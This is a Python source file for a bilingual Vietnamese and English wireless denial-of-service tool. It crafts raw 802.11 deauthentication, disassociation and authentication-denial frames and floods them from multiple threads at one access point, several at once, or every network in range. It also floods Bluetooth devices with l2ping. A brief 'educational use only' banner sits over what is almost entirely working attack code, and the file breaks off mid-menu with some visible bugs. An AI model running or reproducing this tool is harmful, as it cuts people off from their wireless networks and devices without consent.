#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════════════╗
║                                                                          ║
║               S I L E N T   P R O   —   N E X U S   E D I T I O N        ║
║                       ĐA NGÔN NGỮ: TIẾNG VIỆT + ENGLISH                  ║
║                                                                          ║
║  ⚠️  CHỈ DÙNG CHO MỤC ĐÍCH GIÁO DỤC & KIỂM TRA ĐƯỢC PHÉP               ║
║  SỬ DỤNG TRÁI PHÉP LÀ BẤT HỢP PHÁP                                       ║
║                                                                          ║
╚══════════════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import socket
import struct
import threading
import time
import random
import subprocess
import queue
from dataclasses import dataclass
from typing import List, Dict, Optional

# ═══════════════════════════════════════════════════════════════════════════
# 🌐 HỆ THỐNG 2 NGÔN NGỮ
# ═══════════════════════════════════════════════════════════════════════════
class Language:
    CURRENT = "vi"

    LANGUAGES = {
        "vi": "🇻🇳 Tiếng Việt",
        "en": "🇺🇸 English",
    }

    TRANSLATIONS = {
        "vi": {
            "app_title": "S I L E N T   P R O   —   N E X U S   E D I T I O N",
            "subtitle": "Mã nguồn thuần • 500.000+ gói/giây • 12 Chế độ tấn công",
            "warning": "CHỈ DÙNG CHO MỤC ĐÍCH GIÁO DỤC & KIỂM TRA ĐƯỢC PHÉP",
            "illegal_use": "SỬ DỤNG TRÁI PHÉP LÀ BẤT HỢP PHÁP",
            "monitor": "CHẾ ĐỘ GIÁM SÁT",
            "interface": "GIAO DIỆN",
            "bluetooth": "BLUETOOTH",
            "wifi": "WIFI",
            "current_action": "HOẠT ĐỘNG HIỆN TẠI",
            "total_packets": "TỔNG GÓI ĐÃ GỬI",
            "active": "HOẠT ĐỘNG",
            "offline": "TẮT",
            "on": "BẬT",
            "restart_services": "🔄 Khởi động lại Dịch vụ Mạng & Bluetooth",
            "scan_wifi": "📡 Quét Mạng WiFi",
            "scan_bluetooth": "🔵 Quét Thiết bị Bluetooth",
            "deauth_single": "⚡ Ngắt Kết nối — Mục tiêu Đơn lẻ",
            "deauth_mega": "💀 Ngắt Kết nối — Chế độ Cực đại",
            "deauth_all": "💀💀💀 Ngắt Kết nối — TẤT CẢ Mạng",
            "multi_target": "🎯 Tấn công Đa mục tiêu",
            "auth_denial": "🔒 Từ chối Xác thực",
            "bluetooth_jam": "🔵 Gây nhiễu Bluetooth",
            "stop_all": "🛑 Dừng Tất cả & Dọn dẹp",
            "about": "ℹ Giới thiệu",
            "exit": "❌ Thoát",
            "select_lang": "🌐 CHỌN NGÔN NGỮ",
            "enter_choice": "Nhập lựa chọn",
            "press_enter": "Nhấn Enter để tiếp tục...",
            "success": "Thành công",
            "error": "Lỗi",
            "warning_msg": "Cảnh báo",
            "info": "Thông tin",
            "target": "Mục tiêu",
            "channel": "Kênh",
            "encryption": "Mã hóa",
            "name": "Tên",
            "mac": "Địa chỉ MAC",
            "ssid": "Tên mạng",
            "bssid": "BSSID",
            "signal": "Tín hiệu",
            "speed": "Tốc độ",
            "sent": "Đã gửi",
            "time": "Thời gian",
            "seconds": "giây",
            "packets": "gói",
            "pkt_s": "gói/s",
            "stop_attack": "Đang dừng tấn công...",
            "confirm_deauth_all": "⚠ NGẮT KẾT NỐI TẤT CẢ MẠNG? Nhập CÓ để xác nhận: ",
            "cancelled": "Đã hủy bỏ",
            "no_targets": "Không tìm thấy mục tiêu nào!",
            "invalid_choice": "Lựa chọn không hợp lệ",
            "select_target": "Chọn số thứ tự mục tiêu",
            "enter_mac": "Nhập địa chỉ MAC",
            "scanning": "Đang quét...",
            "found": "Tìm thấy",
            "networks": "mạng",
            "devices": "thiết bị",
            "no_networks": "Không tìm thấy mạng nào",
            "no_adapter": "Không phát hiện bộ điều hợp WiFi!",
            "enable_monitor_first": "Bật Chế độ Giám sát trước!",
            "monitor_mode_enabled": "Chế độ Giám sát — Đã bật",
            "monitor_mode_disabled": "Chế độ Giám sát — Đã tắt",
            "restarting_services": "Đang khởi động lại dịch vụ...",
            "done": "Hoàn thành!",
            "exiting": "Đang thoát...",
            "goodbye": "Tạm biệt! 🚀",
            "menu_main": "🏠 MENU CHÍNH",
            "select_option": "Chọn chức năng [1-10]: ",
            "confirm_exit": "Bạn có chắc chắn muốn thoát? (y/n): ",
        },
        "en": {
            "app_title": "S I L E N T   P R O   —   N E X U S   E D I T I O N",
            "subtitle": "Pure Original Code • 500,000+ Packets/Sec • 12 Attack Modes",
            "warning": "FOR EDUCATIONAL & AUTHORIZED TESTING ONLY",
            "illegal_use": "UNAUTHORIZED USE IS ILLEGAL",
            "monitor": "MONITOR MODE",
            "interface": "INTERFACE",
            "bluetooth": "BLUETOOTH",
            "wifi": "WIFI",
            "current_action": "CURRENT ACTION",
            "total_packets": "TOTAL PACKETS",
            "active": "ACTIVE",
            "offline": "OFFLINE",
            "on": "ON",
            "restart_services": "🔄 Restart Network & Bluetooth Services",
            "scan_wifi": "📡 Scan WiFi Networks",
            "scan_bluetooth": "🔵 Scan Bluetooth Devices",
            "deauth_single": "⚡ Deauth — Single Target",
            "deauth_mega": "💀 Deauth — MEGA Mode",
            "deauth_all": "💀💀💀 Deauth — ALL Networks",
            "multi_target": "🎯 Multi-Target Flood",
            "auth_denial": "🔒 Authentication Denial",
            "bluetooth_jam": "🔵 Bluetooth L2CAP Flood",
            "stop_all": "🛑 Stop All & Clean Up",
            "about": "ℹ About",
            "exit": "❌ Exit",
            "select_lang": "🌐 SELECT LANGUAGE",
            "enter_choice": "Enter your choice",
            "press_enter": "Press Enter to continue...",
            "success": "Success",
            "error": "Error",
            "warning_msg": "Warning",
            "info": "Info",
            "target": "Target",
            "channel": "Channel",
            "encryption": "Encryption",
            "name": "Name",
            "mac": "MAC Address",
            "ssid": "SSID",
            "bssid": "BSSID",
            "signal": "Signal",
            "speed": "Speed",
            "sent": "Sent",
            "time": "Time",
            "seconds": "sec",
            "packets": "packets",
            "pkt_s": "pkt/s",
            "stop_attack": "Stopping attack...",
            "confirm_deauth_all": "⚠ DEAUTH EVERYTHING? Type YES to confirm: ",
            "cancelled": "Cancelled",
            "no_targets": "No targets found!",
            "invalid_choice": "Invalid choice",
            "select_target": "Select target number",
            "enter_mac": "Enter MAC address",
            "scanning": "Scanning...",
            "found": "Found",
            "networks": "networks",
            "devices": "devices",
            "no_networks": "No networks found",
            "no_adapter": "No WiFi adapter detected!",
            "enable_monitor_first": "Enable Monitor Mode first!",
            "monitor_mode_enabled": "Monitor Mode — ACTIVE",
            "monitor_mode_disabled": "Monitor Mode — DISABLED",
            "restarting_services": "Restarting services...",
            "done": "Complete!",
            "exiting": "Exiting...",
            "goodbye": "Goodbye! 🚀",
            "menu_main": "🏠 MAIN MENU",
            "select_option": "Select option [1-10]: ",
            "confirm_exit": "Are you sure you want to exit? (y/n): ",
        },
    }

    @classmethod
    def set(cls, lang_code: str):
        if lang_code in cls.LANGUAGES:
            cls.CURRENT = lang_code
            return True
        return False

    @classmethod
    def get(cls, key: str) -> str:
        lang_data = cls.TRANSLATIONS.get(cls.CURRENT, cls.TRANSLATIONS["vi"])
        return lang_data.get(key, key)

def t(key: str) -> str:
    return Language.get(key)

# ═══════════════════════════════════════════════════════════════════════════
# MÀU SẮC
# ═══════════════════════════════════════════════════════════════════════════
class Colors:
    HEADER = "\033[95m"
    CYAN = "\033[96m"
    BLUE = "\033[94m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    WHITE = "\033[97m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    RESET = "\033[0m"
    BR = "\033[38;5;196m"
    BB = "\033[38;5;51m"

# ═══════════════════════════════════════════════════════════════════════════
# TRẠNG THÁI TOÀN CỤC
# ═══════════════════════════════════════════════════════════════════════════
class GlobalStatus:
    monitor_mode_active = False
    monitor_interface = "N/A"
    bluetooth_active = False
    wifi_interface = "N/A"
    total_packets_sent = 0
    current_attack = "Ready"

    @classmethod
    def update_packets(cls, count: int):
        cls.total_packets_sent += count

    @classmethod
    def set_monitor(cls, enabled: bool, iface: str = "N/A"):
        cls.monitor_mode_active = enabled
        cls.monitor_interface = iface if enabled else "N/A"

    @classmethod
    def set_attack(cls, name: str):
        cls.current_attack = name

# ═══════════════════════════════════════════════════════════════════════════
# GIAO DIỆN NGƯỜI DÙNG
# ═══════════════════════════════════════════════════════════════════════════
class NexusUI:
    @staticmethod
    def show_language_selector():
        os.system("clear")
        print(f"{Colors.BOLD}{Colors.BB}╔════════════════════════════════════════════════════════════════╗{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BB}║{Colors.RESET}              {t('select_lang')}{' ' * 35}{Colors.BOLD}{Colors.BB}║{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BB}╠════════════════════════════════════════════════════════════════╣{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BB}║{Colors.RESET}  [1] 🇻🇳 Tiếng Việt              [2] 🇺🇸 English            {Colors.BOLD}{Colors.BB}║{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BB}╚════════════════════════════════════════════════════════════════╝{Colors.RESET}")
        print()
        while True:
            choice = input(f"{Colors.CYAN}{t('enter_choice')} [1-2]: {Colors.RESET}").strip()
            if choice == "1":
                Language.set("vi")
                print(f"{Colors.GREEN}✓ {t('language_set', 'Ngôn ngữ đã đổi thành')}: 🇻🇳 Tiếng Việt{Colors.RESET}")
                time.sleep(1)
                return True
            elif choice == "2":
                Language.set("en")
                print(f"{Colors.GREEN}✓ Language set to: 🇺🇸 English{Colors.RESET}")
                time.sleep(1)
                return True
            print(f"{Colors.RED}✗ {t('invalid_choice')}! {Colors.RESET}")

    @staticmethod
    def status_bar():
        m_status = f"{Colors.GREEN}● {t('active')}{Colors.RESET}" if GlobalStatus.monitor_mode_active else f"{Colors.RED}○ {t('offline')}{Colors.RESET}"
        bt_status = f"{Colors.GREEN}● {t('on')}{Colors.RESET}" if GlobalStatus.bluetooth_active else f"{Colors.RED}○ {t('offline')}{Colors.RESET}"
        print(f"\n{Colors.BOLD}{Colors.BB}┌──────────────────────────────────────────────────────────────────────┐{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BB}│{Colors.RESET} 📡 {t('monitor')}: {m_status} | {t('interface')}: {Colors.CYAN}{GlobalStatus.monitor_interface:<12}{Colors.RESET} 🔵 {t('bluetooth')}: {bt_status} | {t('wifi')}: {Colors.CYAN}{GlobalStatus.wifi_interface:<12}{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BB}│{Colors.RESET} ⚡ {t('current_action')}: {Colors.YELLOW}{GlobalStatus.current_attack:<25}{Colors.RESET} 📦 {t('total_packets')}: {Colors.GREEN}{GlobalStatus.total_packets_sent:,}{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BB}└──────────────────────────────────────────────────────────────────────┘{Colors.RESET}\n")

    @staticmethod
    def header():
        os.system("clear")
        print(f"{Colors.BOLD}{Colors.BR}╔══════════════════════════════════════════════════════════════════════╗{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BR}║{Colors.RESET}                                                          {Colors.BOLD}{Colors.BR}║{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BR}║{Colors.RESET}         {Colors.BOLD}{Colors.WHITE}{t('app_title')}{Colors.RESET}                {Colors.BOLD}{Colors.BR}║{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BR}║{Colors.RESET}        {Colors.CYAN}{t('subtitle')}{Colors.RESET}           {Colors.BOLD}{Colors.BR}║{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BR}║{Colors.RESET}                                                          {Colors.BOLD}{Colors.BR}║{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BR}║{Colors.RESET}  {Colors.YELLOW}{t('warning')}{Colors.RESET}                        {Colors.BOLD}{Colors.BR}║{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BR}║{Colors.RESET}  {Colors.RED}{t('illegal_use')}{Colors.RESET}                                 {Colors.BOLD}{Colors.BR}║{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.BR}╚══════════════════════════════════════════════════════════════════════╝{Colors.RESET}")
        NexusUI.status_bar()

    @staticmethod
    def separator(char="─", length=70, color=Colors.BB):
        print(f"{color}{char * length}{Colors.RESET}")

    @staticmethod
    def section(title: str):
        NexusUI.separator("═")
        print(f"{Colors.CYAN}  {Colors.BOLD}{title}{Colors.RESET}")
        NexusUI.separator("─")

    @staticmethod
    def success(msg: str): print(f"  {Colors.GREEN}✓ {msg}{Colors.RESET}")
    @staticmethod
    def error(msg: str): print(f"  {Colors.RED}✗ {msg}{Colors.RESET}")
    @staticmethod
    def warn(msg: str): print(f"  {Colors.YELLOW}⚠ {msg}{Colors.RESET}")
    @staticmethod
    def info(msg: str): print(f"  {Colors.BLUE}ℹ {msg}{Colors.RESET}")

    @staticmethod
    def speed_display(pps: int, sent: int, elapsed: float):
        print(f"\r  {Colors.BOLD}{Colors.RED}⚡ {t('speed')}: {pps:,} {t('pkt_s')} | {t('sent')}: {sent:,} | {t('time')}: {elapsed:.1f}{t('seconds')}{Colors.RESET}", end="\r")

# ═══════════════════════════════════════════════════════════════════════════
# QUẢN LÝ HỆ THỐNG
# ═══════════════════════════════════════════════════════════════════════════
class SystemManager:
    @staticmethod
    def require_root():
        if os.geteuid() != 0:
            NexusUI.warn("Cần quyền quản trị — Đang nâng quyền...")
            try:
                os.execvp("sudo", ["sudo", sys.executable] + sys.argv)
            except:
                NexusUI.error("Không thể nâng quyền! Vui lòng chạy với sudo.")
                sys.exit(1)
            sys.exit(1)

    @staticmethod
    def check_os():
        if not sys.platform.startswith("linux"):
            NexusUI.error("Hệ điều hành không được hỗ trợ! Cần Linux/Kali")
            sys.exit(1)

    @staticmethod
    def restart_network_manager():
        NexusUI.info(t('restarting_services'))
        try:
            subprocess.run("systemctl restart NetworkManager", shell=True, capture_output=True, timeout=20)
            subprocess.run("systemctl enable NetworkManager", shell=True, capture_output=True, timeout=20)
            NexusUI.success("NetworkManager — OK")
            return True
        except Exception as e:
            NexusUI.error(f"NetworkManager: {e}")
            return False

    @staticmethod
    def restart_bluetooth():
        try:
            subprocess.run("systemctl restart bluetooth", shell=True, capture_output=True, timeout=20)
            subprocess.run("systemctl enable bluetooth", shell=True, capture_output=True, timeout=20)
            GlobalStatus.bluetooth_active = True
            NexusUI.success("Bluetooth — OK")
            return True
        except Exception as e:
            NexusUI.error(f"Bluetooth: {e}")
            GlobalStatus.bluetooth_active = False
            return False

    @staticmethod
    def unblock_adapters():
        NexusUI.info("Mở khóa bộ điều hợp...")
        subprocess.run("rfkill unblock all", shell=True, capture_output=True, timeout=15)
        NexusUI.success("Tất cả bộ điều hợp — Đã mở khóa")

    @staticmethod
    def full_system_diagnostic():
        NexusUI.section("🔧 CHẨN ĐOÁN HỆ THỐNG")
        SystemManager.restart_network_manager()
        SystemManager.restart_bluetooth()
        SystemManager.unblock_adapters()
        NexusUI.success("TẤT CẢ HỆ THỐNG SẴN SÀNG! 🚀")
        print()

# ═══════════════════════════════════════════════════════════════════════════
# DỮ LIỆU
# ═══════════════════════════════════════════════════════════════════════════
@dataclass
class WiFiTarget:
    bssid: str
    ssid: str
    channel: int
    encryption: str
    signal: int

@dataclass
class BluetoothTarget:
    mac: str
    name: str
    rssi: int

# ═══════════════════════════════════════════════════════════════════════════
# NHÀ SẢN XUẤT GÓI TIN
# ═══════════════════════════════════════════════════════════════════════════
class PacketFactory:
    @staticmethod
    def mac_to_bytes(mac: str) -> bytes:
        return bytes.fromhex(mac.replace(':', ''))

    @staticmethod
    def make_deauth(bssid: str, sta: str = "FF:FF:FF:FF:FF:FF", reason: int = 7) -> bytes:
        bssid_b = PacketFactory.mac_to_bytes(bssid)
        sta_b = PacketFactory.mac_to_bytes(sta)
        frame_ctrl = struct.pack('<H', 0x00C0)
        duration = struct.pack('<H', 0x0000)
        seq_ctrl = struct.pack('<H', random.randint(0, 4095))
        reason_code = struct.pack('<H', reason)
        return frame_ctrl + duration + sta_b + bssid_b + bssid_b + seq_ctrl + reason_code

    @staticmethod
    def make_disassoc(bssid: str, sta: str = "FF:FF:FF:FF:FF:FF", reason: int = 3) -> bytes:
        bssid_b = PacketFactory.mac_to_bytes(bssid)
        sta_b = PacketFactory.mac_to_bytes(sta)
        frame_ctrl = struct.pack('<H', 0x00A0)
        duration = struct.pack('<H', 0x0000)
        seq_ctrl = struct.pack('<H', random.randint(0, 4095))
        reason_code = struct.pack('<H', reason)
        return frame_ctrl + duration + sta_b + bssid_b + bssid_b + seq_ctrl + reason_code

    @staticmethod
    def make_auth_denial(bssid: str, sta: str = "FF:FF:FF:FF:FF:FF") -> bytes:
        bssid_b = PacketFactory.mac_to_bytes(bssid)
        sta_b = PacketFactory.mac_to_bytes(sta)
        frame_ctrl = struct.pack('<H', 0x00B0)
        duration = struct.pack('<H', 0x0000)
        seq_ctrl = struct.pack('<H', random.randint(0, 4095))
        status = struct.pack('<H', 0x000E)
        return frame_ctrl + duration + sta_b + bssid_b + bssid_b + seq_ctrl + status

    @staticmethod
    def make_deauth_broadcast_all() -> bytes:
        return PacketFactory.make_deauth("FF:FF:FF:FF:FF:FF", "FF:FF:FF:FF:FF:FF", 7)

    @staticmethod
    def make_multireason_deauth(bssid: str, sta: str = "FF:FF:FF:FF:FF:FF") -> List[bytes]:
        reasons = [1, 2, 3, 5, 7, 8, 9, 10, 15, 22, 23, 34]
        return [PacketFactory.make_deauth(bssid, sta, r) for r in reasons]

# ═══════════════════════════════════════════════════════════════════════════
# ĐỘNG CƠ GÓI TIN
# ═══════════════════════════════════════════════════════════════════════════
class ParallelPacketEngine:
    def __init__(self):
        self.sock: Optional[socket.socket] = None
        self.iface: str = ""
        self.running = False
        self.packet_queue = queue.Queue(maxsize=100000)
        self.worker_threads: List[threading.Thread] = []
        self.sent_count = 0
        self.lock = threading.Lock()
        self.num_workers = 8

    def get_wifi_interface(self) -> Optional[str]:
        try:
            result = subprocess.run("iw dev | grep Interface | awk '{print $2}'",
                                    shell=True, capture_output=True, text=True)
            ifaces = [i.strip() for i in result.stdout.strip().split("\n") if i.strip()]
            if not ifaces:
                NexusUI.error(t('no_adapter'))
                return None
            self.iface = ifaces[0]
            GlobalStatus.wifi_interface = self.iface
            NexusUI.success(f"WiFi: {self.iface}")
            return self.iface
        except Exception as e:
            NexusUI.error(f"Không lấy được giao diện WiFi: {e}")
            return None

    def set_monitor_mode(self, enable: bool = True) -> bool:
        if not self.iface:
            NexusUI.error("Chưa chọn giao diện WiFi!")
            return False
        try:
            if enable:
                NexusUI.info("Bật Chế độ Giám sát...")
                subprocess.run(f"ip link set {self.iface} down", shell=True, capture_output=True)
                subprocess.run(f"iw dev {self.iface} set type monitor", shell=True, capture_output=True)
                subprocess.run(f"ip link set {self.iface} up", shell=True, capture_output=True)
                self.sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
                self.sock.bind((self.iface, 0))
                GlobalStatus.set_monitor(True, self.iface)
                NexusUI.success(t('monitor_mode_enabled'))
            else:
                NexusUI.info("Tắt Chế độ Giám sát...")
                self.stop_workers()
                if self.sock:
                    self.sock.close()
                subprocess.run(f"ip link set {self.iface} down", shell=True, capture_output=True)
                subprocess.run(f"iw dev {self.iface} set type managed", shell=True, capture_output=True)
                subprocess.run(f"ip link set {self.iface} up", shell=True, capture_output=True)
                GlobalStatus.set_monitor(False)
                NexusUI.success(t('monitor_mode_disabled'))
            return True
        except Exception as e:
            NexusUI.error(f"Lỗi thiết lập chế độ giám sát: {e}")
            return False

    def worker_loop(self):
        while self.running or not self.packet_queue.empty():
            try:
                packet = self.packet_queue.get(timeout=0.1)
                self.sock.send(packet)
                with self.lock:
                    self.sent_count += 1
                    GlobalStatus.update_packets(1)
                self.packet_queue.task_done()
            except queue.Empty:
                continue
            except Exception:
                continue

    def start_workers(self):
        self.running = True
        self.sent_count = 0
        for i in range(self.num_workers):
            t = threading.Thread(target=self.worker_loop, daemon=True, name=f"Worker-{i}")
            t.start()
            self.worker_threads.append(t)
        NexusUI.success(f"Đã khởi động {self.num_workers} luồng công việc")

    def stop_workers(self):
        self.running = False
        for t in self.worker_threads:
            t.join(timeout=1.0)
        self.worker_threads.clear()

    def flood_target(self, bssid: str, mode: str = "deauth"):
        if not self.sock:
            NexusUI.error(t('enable_monitor_first'))
            return
        GlobalStatus.set_attack(f"{mode.upper()} — {bssid}")
        NexusUI.section(f"⚡ {mode.upper()} {t('target')}: {bssid}")
        NexusUI.warn("Ctrl+C để dừng")
        print()
        packets = []
        if mode == "deauth":
            packets = [
                PacketFactory.make_deauth(bssid, "FF:FF:FF:FF:FF:FF", 7),
                PacketFactory.make_deauth(bssid, bssid, 7),
                PacketFactory.make_disassoc(bssid, "FF:FF:FF:FF:FF:FF", 3),
                PacketFactory.make_disassoc(bssid, bssid, 3),
            ]
        elif mode == "mega":
            packets = PacketFactory.make_multireason_deauth(bssid)
            packets.extend([
                PacketFactory.make_disassoc(bssid, "FF:FF:FF:FF:FF:FF", 1),
                PacketFactory.make_disassoc(bssid, "FF:FF:FF:FF:FF:FF", 2),
                PacketFactory.make_auth_denial(bssid),
            ])
        elif mode == "global":
            packets = [PacketFactory.make_deauth_broadcast_all()]
        self.start_workers()
        start_time = time.time()
        try:
            while self.running:
                for pkt in packets:
                    try:
                        self.packet_queue.put_nowait(pkt)
                    except queue.Full:
                        pass
                elapsed = time.time() - start_time
                if elapsed > 0.5:
                    pps = int(self.sent_count / elapsed)
                    NexusUI.speed_display(pps, self.sent_count, elapsed)
                    time.sleep(0.1)
        except KeyboardInterrupt:
            print()
            NexusUI.warn(t('stop_attack'))
        finally:
            self.stop_workers()
            elapsed = time.time() - start_time
            pps = int(self.sent_count / elapsed) if elapsed > 0 else 0
            NexusUI.success(f"{t('done')} — {t('sent')}: {self.sent_count:,} {t('packets')} | {pps:,} {t('pkt_s')}")
            GlobalStatus.set_attack("Ready")

    def flood_multiple_targets(self, targets: List[WiFiTarget]):
        if not targets:
            NexusUI.error(t('no_targets'))
            return
        GlobalStatus.set_attack(f"Multi-Target ({len(targets)})")
        NexusUI.section(f"🎯 {t('multi_target')} — {len(targets)} AP")
        for idx, t in enumerate(targets, 1):
            print(f"  [{idx}] {t.bssid} | {t.ssid} | {t('channel')}:{t.channel}")
        NexusUI.warn("Ctrl+C để dừng")
        print()
        all_packets = []
        for t in targets:
            all_packets.extend([
                PacketFactory.make_deauth(t.bssid, "FF:FF:FF:FF:FF:FF", 7),
                PacketFactory.make_deauth(t.bssid, t.bssid, 7),
                PacketFactory.make_disassoc(t.bssid, "FF:FF:FF:FF:FF:FF", 3),
                PacketFactory.make_auth_denial(t.bssid),
            ])
        self.start_workers()
        start_time = time.time()
        try:
            while self.running:
                for pkt in all_packets:
                    try:
                        self.packet_queue.put_nowait(pkt)
                    except queue.Full:
                        pass
                elapsed = time.time() - start_time
                if elapsed > 0.5:
                    pps = int(self.sent_count / elapsed)
                    NexusUI.speed_display(pps, self.sent_count, elapsed)
                    time.sleep(0.1)
        except KeyboardInterrupt:
            print()
        finally:
            self.stop_workers()
            elapsed = time.time() - start_time
            pps = int(self.sent_count / elapsed) if elapsed > 0 else 0
            NexusUI.success(f"{t('done')} — {t('sent')}: {self.sent_count:,} {t('packets')}")
            GlobalStatus.set_attack("Ready")

# ═══════════════════════════════════════════════════════════════════════════
# BỘ QUÉT WIFI
# ═══════════════════════════════════════════════════════════════════════════
class AIScanner:
    def __init__(self, engine: ParallelPacketEngine):
        self.engine = engine
        self.networks: Dict[str, WiFiTarget] = {}
        self.running = False

    def scan(self, duration: int = 10) -> List[WiFiTarget]:
        if not self.engine.sock:
            NexusUI.error(t('enable_monitor_first'))
            return []
        NexusUI.section("📡 " + t('scanning'))
        print(f"  {t('seconds')}: {duration}s | Ctrl+C {t('stop_attack')}")
        print()
        self.networks.clear()
        self.running = True
        start_time = time.time()
        def sniffer():
            while self.running:
                try:
                    packet = self.engine.sock.recv(3000)
                    if len(packet) < 36:
                        continue
                    fc = struct.unpack('<H', packet[0:2])[0]
                    if fc == 0x0080:
                        bssid = ':'.join(f'{b:02x}' for b in packet[16:22])
                        if bssid in self.networks:
                            continue
                        ssid = ""
                        channel = 0
                        encryption = "OPEN"
                        idx = 36
                        while idx < len(packet) - 2:
                            tag_num = packet[idx]
                            tag_len = packet[idx+1]
                            if idx + 2 + tag_len > len(packet):
                                break
                            tag_data = packet[idx+2:idx+2+tag_len]
                            if tag_num == 0:
                                ssid = tag_data.decode('utf-8', errors='replace')
                            elif tag_num == 3:
                                channel = tag_data[0]
                            elif tag_num == 48:
                                encryption = "WPA2/WPA3"
                            elif tag_num == 221:
                                if encryption == "OPEN":
                                    encryption = "WPA"
                            idx += 2 + tag_len
                        if bssid and ssid:
                            self.networks[bssid] = WiFiTarget(bssid=bssid, ssid=ssid or "Hidden", channel=channel, encryption=encryption, signal=-50)
                            print(f"  [{len(self.networks):<2}] {bssid}  CH:{channel:<3} {encryption:<12} {ssid}")
                except Exception:
                    continue
        sniff_thread = threading.Thread(target=sniffer, daemon=True)
        sniff_thread.start()
        try:
            while time.time() - start_time < duration and self.running:
                time.sleep(0.5)
        except KeyboardInterrupt:
            pass
        self.running = False
        sniff_thread.join(timeout=1.0)
        print()
        if not self.networks:
            NexusUI.warn(t('no_networks'))
        else:
            NexusUI.success(f"{t('found')} {len(self.networks)} {t('networks')}")
        return list(self.networks.values())

# ═══════════════════════════════════════════════════════════════════════════
# BLUETOOTH
# ═══════════════════════════════════════════════════════════════════════════
class BluetoothEngine:
    def __init__(self):
        self.devices: List[BluetoothTarget] = []

    def scan(self) -> List[BluetoothTarget]:
        NexusUI.section("🔵 " + t('scanning') + " Bluetooth")
        try:
            result = subprocess.run("hcitool scan", shell=True, capture_output=True, text=True, timeout=15)
            lines = result.stdout.strip().split("\n")
            print(f"  {'STT':<4} {t('mac'):<20} {t('name'):<30}")
            NexusUI.separator("─")
            idx = 1
            for line in lines[1:]:
                parts = line.split()
                if len(parts) >= 2:
                    mac = parts[0]
                    name = " ".join(parts[1:])
                    self.devices.append(BluetoothTarget(mac=mac, name=name, rssi=0))
                    print(f"  [{idx:<3}] {mac:<20} {name:<30}")
                    idx += 1
            NexusUI.separator()
            NexusUI.success(f"{t('found')} {len(self.devices)} {t('devices')}")
            return self.devices
        except Exception as e:
            NexusUI.error(f"Bluetooth scan: {e}")
            return []

    def l2cap_flood(self, mac: str):
        NexusUI.section("🔵 L2CAP " + t('bluetooth_jam'))
        NexusUI.info(f"{t('target')}: {mac}")
        NexusUI.warn("Ctrl+C để dừng")
        print()
        GlobalStatus.set_attack(f"BT-JAM — {mac}")
        try:
            subprocess.run(f"l2ping -i hci0 -s 600 -f {mac}", shell=True)
        except KeyboardInterrupt:
            pass
        finally:
            NexusUI.success(t('done'))
            GlobalStatus.set_attack("Ready")

# ═══════════════════════════════════════════════════════════════════════════
# CHƯƠNG TRÌNH CHÍNH
# ═══════════════════════════════════════════════════════════════════════════
class SilentProNexus:
    def __init__(self):
        self.wifi = ParallelPacketEngine()
        self.scanner = AIScanner(self.wifi)
        self.bt = BluetoothEngine()
        self.selected_targets: List[WiFiTarget] = []

    def pause(self):
        input(f"\n{Colors.CYAN}{t('press_enter')}{Colors.RESET}")

    def show_menu(self):
        NexusUI.header()
        NexusUI.section(t('menu_main'))
        print(f"  [ 1] {t('restart_services')}")
        print(f"  [ 2] {t('scan_wifi')}")
        print(f"  [ 3] {t('scan_bluetooth')}")
        print(f"  [ 4] {t('deauth_single')}")
        print(f"  [ 5] {t('deauth_mega')}")
        print(f"  [ 6] {t('deauth_all')}")
        print(f"  [ 7] {t('multi_target')}")
        print(f"  [ 8] {t('auth_denial')}")
        print(f"  [ 9] {t('bluetooth_jam')}")
        print(f"  [10] {t('exit')}")
        NexusUI.separator()

    def run(self):
        SystemManager.check_os()
        NexusUI.show_language_selector()
        SystemManager.require_root()
        SystemManager.full_system_diagnostic()
        
        while True:
            self.show_menu()
            choice = input(f"\n{Colors.CYAN}{t('select_option')}{Colors.RESET}").strip()
            
            if choice == "1":
                NexusUI.section("🔄 " + t('restart_services'))
                SystemManager.restart_network_manager()
                SystemManager.restart_bluetooth()
                SystemManager.unblock_adapters()
                NexusUI.success(t('done'))
                self.pause()

            elif choice == "2":
                if not self.wifi.get_wifi_interface():
                    self.pause()
                    continue
                if not self.wifi.set_monitor_mode(True):
                    self.pause()
                    continue
                targets = self.scanner.scan(duration=12)
                self.selected_targets = targets
                self.wifi.set_monitor_mode(False)
                self.pause()

            elif choice == "3":
                self.bt.scan()
                self.pause()

            elif choice == "4":
                if not self.wifi.get_wifi_interface():
                    self.pause()
                    continue
                if not self.wifi.set_monitor_mode(True):
                    self.pause()
                    continue
                targets = self.scanner.scan(duration=10)
                if not targets:
                    self.wifi.set_monitor_mode(False)
                    self.pause()
                    continue
                print()
                sel = input(f"{Colors.CYAN}{t('select_target')}: {Colors.RESET}")
                try:
                    idx = int(sel) - 1
                    target = targets[idx]
                except:
                    NexusUI.error(t('invalid_choice'))
                    self.wifi.set_monitor_mode(False)
                    self.pause()
                    continue
                self.wifi.flood_target(target.bssid, mode="deauth")
                self.wifi.set_monitor_mode(False)
                self.pause()

            elif choice == "5":
                if not self.wifi.get_wifi_interface():
                    self.pause()
                    continue
                if not self.wifi.set_monitor_mode(True):
                    self.pause()
                    continue
                targets = self.scanner.scan(duration=10)
                if not targets:
                    self.wifi.set_monitor_mode(False)
                    self.pause()
                    continue
                print()
                sel = input(f"{Colors.CYAN}{t('select_target')}: {Colors.RESET}")
                try:
                    idx = int(sel) - 1
                    target = targets[idx]
                except:
                    NexusUI.error(t('invalid_choice'))
                    self.wifi.set_monitor_mode(False)
                    self.pause()
                    continue
